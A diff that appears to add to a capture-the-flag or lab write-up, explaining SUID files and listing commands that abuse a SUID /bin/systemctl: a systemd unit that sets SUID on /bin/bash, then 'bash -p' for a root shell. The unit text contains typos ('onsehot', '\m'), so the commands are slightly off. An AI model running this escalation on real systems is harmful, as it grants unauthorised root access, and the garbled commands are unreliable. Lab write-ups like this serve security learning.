@@ -89,3 +89,12 @@ Tool: Burp Suite - used for web traffic interception and manipulation
        - `/` - start from the highest directory/search all directories
        - `-perm 4000 -type f` - search for files with SUID permissions
        - `2>/dev/null` - put error messages to /dev/null
+   - Set User ID (SUID) - files with these permission run with the permission of the owner
+2. Exploit `/bin/systemctl` with SUID using the following commands:
+      1. `printf "[Service]\nType=onsehot\nExecStart=/bin/sh -c 'chmod +s /bin/bash'\n[Install]\nWantedBy=multi-user.target\m" > /tmp/exploit.service`
+      2. `/bin/systemctl link /tmp/exploit.service`
+      3. `/bin/systemctl enable --now /tmp/exploit.service`
+      4. `bash -p`
+  
+![systemctl exploitation](screenshots/exploit_systemctl_suid.png)
+
